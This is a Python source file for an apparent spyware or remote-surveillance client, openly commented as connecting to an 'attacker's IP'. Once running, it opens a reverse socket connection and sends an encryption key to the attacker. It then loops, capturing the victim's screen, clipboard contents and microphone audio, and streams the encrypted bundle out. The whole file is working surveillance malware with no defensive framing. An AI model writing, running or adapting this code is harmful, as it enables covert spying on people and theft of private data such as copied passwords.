import socket
import struct
import pickle
import cv2
import mss
import numpy as np
from cryptography.fernet import Fernet
import pyperclip
import sounddevice as sd

# Attacker's IP and Port
HOST = "192.168.0.173"
PORT = 8080

freq = 44100  # Frequency for recording audio

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))  # Reverse connect to the attacker

print(f"[+] Connected")

key = Fernet.generate_key()
cipher = Fernet(key)

client.send(key)  # Send key to attacker for decryption

sct = mss.mss()

audio_data = []  # List to store audio chunks

def record_audio(indata, frames, time, status):
    audio_data.append(indata.copy())

# Start non-blocking audio stream
stream = sd.InputStream(samplerate=freq, channels=2, callback=record_audio)
stream.start()

while True:
    screenshot = sct.grab(sct.monitors[1])  # Capture screen
    frame = np.array(screenshot)  # Convert to NumPy array
    frame = cv2.resize(frame, (800, 450))  # Resize

    clipboard = pyperclip.paste()  # Get clipboard content

    # Get the latest recorded audio and clear the list
    if audio_data:
        audio_chunk = np.concatenate(audio_data, axis=0)
        audio_data.clear()
    else:
        audio_chunk = np.array([])  # Empty if no audio recorded

    # Serialize frame, clipboard, and audio
    data = {
        "frame": frame,
        "clipboard": clipboard,
        "audio": audio_chunk
    }

    serialized_data = pickle.dumps(data)  # Ensure serialization to bytes
    encrypted_data = cipher.encrypt(serialized_data)  # Encrypt serialized data

    message = struct.pack("Q", len(encrypted_data)) + encrypted_data

    try:
        client.sendall(message)
    except:
        break

stream.stop()  # Stop audio recording
client.close()
